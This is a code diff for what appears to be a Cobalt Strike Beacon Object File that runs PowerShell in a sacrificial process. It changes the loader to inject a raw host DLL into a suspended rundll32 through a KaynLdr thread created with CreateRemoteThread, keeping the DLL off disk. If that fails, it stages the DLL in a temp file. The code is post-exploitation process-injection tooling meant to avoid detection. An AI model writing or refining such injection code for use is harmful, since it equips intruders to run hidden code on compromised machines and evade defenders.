@@ -387,7 +387,16 @@ static BOOL PpfCreateSacrificial(
     return ok;
 }
 
-#include "powerpick_fork_reflect.h"
+/*
+ * Child-only KaynLdr path: BOF writes raw host DLL + CreateRemoteThread(KaynLoader).
+ * PE mapping runs inside the sacrificial process (not in the agent).
+ */
+#ifndef PPF_USE_REFLECTIVE_HOST
+#define PPF_USE_REFLECTIVE_HOST 1
+#endif
+#if PPF_USE_REFLECTIVE_HOST
+#include "powerpick_fork_kayn_inject.h"
+#endif
 
 typedef struct _PPF_IMPORT_BLOB {
     DWORD length;
@@ -816,7 +825,8 @@ void go(IN PCHAR buffer, IN ULONG blength)
         goto cleanup;
     }
 
-    /* Prefer reflective host map into suspended rundll32 (no host DLL on disk). */
+#if PPF_USE_REFLECTIVE_HOST
+    /* KaynLdr: suspended rundll32 + raw DLL in memory (no host file on disk). */
     MSVCRT$_snprintf(cmdA, 1024, "\"%s\"", loader);
     if (!AsciiToWide(cmdA, cmdW, 1024)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert rundll32 command line");
@@ -831,7 +841,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
             &si,
             &pi)) {
         createdProcess = TRUE;
-        if (!PpfReflectHostDll(pi.hProcess, hostDll, hostDllLen, mapName)) {
+        if (!PpfInjectKaynHost(pi.hProcess, hostDll, hostDllLen, mapName)) {
             KERNEL32$TerminateProcess(pi.hProcess, 1);
             if (pi.hThread) {
                 KERNEL32$CloseHandle(pi.hThread);
@@ -843,16 +853,15 @@ void go(IN PCHAR buffer, IN ULONG blength)
             }
             createdProcess = FALSE;
         }
-        /* Reflective thread runs the host; leave primary thread suspended. */
     }
+#endif
 
     if (!createdProcess) {
-        /* Fallback: stage host DLL + classic rundll32 export entry. */
         if (!WriteTempDll(
                 hostDll, hostDllLen, dllPath, sizeof(dllPath), useImpersonate)) {
             BeaconPrintf(
                 CALLBACK_ERROR,
-                "[!] Reflective host load failed and temp DLL stage failed (err=%lu)",
+                "[!] Failed to stage host DLL (err=%lu)",
                 KERNEL32$GetLastError());
             goto cleanup;
         }
